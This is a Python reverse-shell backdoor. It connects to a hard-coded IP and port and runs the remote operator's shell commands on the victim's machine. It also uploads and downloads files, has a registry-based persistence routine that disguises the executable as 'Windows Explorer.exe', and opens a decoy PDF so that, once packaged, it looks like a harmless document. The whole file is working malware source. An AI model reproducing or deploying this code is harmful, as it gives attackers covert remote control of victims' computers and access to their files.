# !usr/bin/env python
import socket
import subprocess
import json
import os
import base64
import sys
import shutil
class Backdoor:
    def __init__(self,ip,port):
        # self.become_persistent()
        self.connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM) #SOCK_STREAM is for TCP connection
        self.connection.connect((ip,port))

    def become_persistent(self):
        evil_file_location=os.environ['appdata']+'\\Windows Explorer.exe'
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable,evil_file_location) #if python file, __file__ instead of sys.executable
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "'+evil_file_location+'"',shell=True) #add to registry

    def reliable_send(self,data):
        json_data=json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data=''
        while True:
            try:
                json_data=json_data+self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
    
    def change_directory(self,path):
        os.chdir(path)
        return '[+] Changing directory to '+path

    def read_file(self,path):
        with open(path,'rb') as file:
            return base64.b64encode(file.read()) #use base64 encoding to handle binary data, if not throws error
        
    def write_file(self,path,content):
        with open(path,'wb') as file:
            file.write(base64.b64decode(content))
            return '[+] Upload successful'

    def execute_system_command(self,command):
        DEVNULL=open(os.devnull,'wb')  #Devnull is a special file that discards all data written to it
        return subprocess.check_output(command,shell=True, stderr=DEVNULL, stdin=DEVNULL)
        # return subprocess.check_output(command,shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL) #python3
    
    def execute_command(self,command):
        try:
            if command[0]=='exit':
                self.connection.close()
                sys.exit()
            elif command[0]=='cd' and len(command)>1:
                return self.change_directory(command[1])
            elif command[0]=='download':
                return self.read_file(command[1])
            elif command[0]=='upload':
                self.reliable_send('ok')
                file_content=self.reliable_receive()
                return self.write_file(command[1],file_content)
            else:
                return self.execute_system_command(command)
        except Exception:
            return '[-] Error during command execution'

    def run(self):
        while True:
            command=self.reliable_receive()
            command_result=self.execute_command(command)  
            self.reliable_send(command_result)

file_name = sys._MEIPASS + "\sample.pdf" #MEIPASS is a temporary directory created by pyinstaller to extract files, default is C:\Users\username\AppData\Local\Temp\_MEIxxxxx
subprocess.Popen(file_name,shell=True) #open pdf file
#use  try except to not show error message when error occurs when connection is lost or not listening       
try:
    my_backdoor=Backdoor('192.168.209.138',4444)
    my_backdoor.run()
except Exception:
    sys.exit()